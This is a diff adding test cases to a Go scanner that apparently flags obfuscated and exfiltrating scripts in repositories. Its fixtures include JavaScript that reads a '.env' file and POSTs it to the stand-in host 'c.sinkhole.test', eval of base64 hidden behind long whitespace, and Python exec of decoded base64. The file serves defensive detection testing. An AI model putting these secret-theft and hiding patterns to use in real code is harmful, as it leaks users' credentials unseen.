@@ -106,6 +106,36 @@ func TestScriptHeuristics(t *testing.T) {
 			wantAt:   map[string]string{"GAL-EXFIL-001": "sync.py:3"},
 		},
 		{
+			name:     "code padded behind a closed block comment",
+			setup:    filesRepo(map[string]string{"index.js": "/* status */" + strings.Repeat(" ", 300) + "eval(atob('aGVsbG8='));\n"}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-OBF-001": "index.js:1", "GAL-OBF-002": "index.js:1"},
+		},
+		{
+			name:     "exfiltration on the line of a block comment",
+			setup:    filesRepo(map[string]string{"c.js": "/* config loader */ const env = require('fs').readFileSync('.env','utf8'); require('https').request({hostname:'c.sinkhole.test',method:'POST'}).end(env);\n"}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-EXFIL-001": "c.js:1"},
+		},
+		{
+			name:     "exfiltration through a module held in a variable",
+			setup:    filesRepo(map[string]string{"c.js": "const fs = require('fs');\nconst client = require('https');\nconst env = fs.readFileSync('.env', 'utf8');\nclient.request({ hostname: 'c.sinkhole.test', method: 'POST' }).end(env);\n"}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-EXFIL-001": "c.js:3"},
+		},
+		{
+			name:     "exfiltration through a named ESM import",
+			setup:    filesRepo(map[string]string{"c.mjs": "import { readFileSync } from 'node:fs';\nimport { request } from 'node:https';\nconst env = readFileSync('.env', 'utf8');\nrequest({ hostname: 'c.sinkhole.test', method: 'POST' }).end(env);\n"}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-EXFIL-001": "c.mjs:3"},
+		},
+		{
+			name:     "python decodes with codecs and execs",
+			setup:    filesRepo(map[string]string{"app.py": "import codecs\nexec(codecs.decode('aW1wb3J0IG9z', 'base64'))\n"}),
+			wantCode: 10,
+			wantAt:   map[string]string{"GAL-OBF-002": "app.py:2"},
+		},
+		{
 			name:     "1 MB of spaces hides code on line 1",
 			setup:    filesRepo(map[string]string{"index.js": "run();" + strings.Repeat(" ", 1<<20) + "steal();\n"}),
 			wantCode: 10,
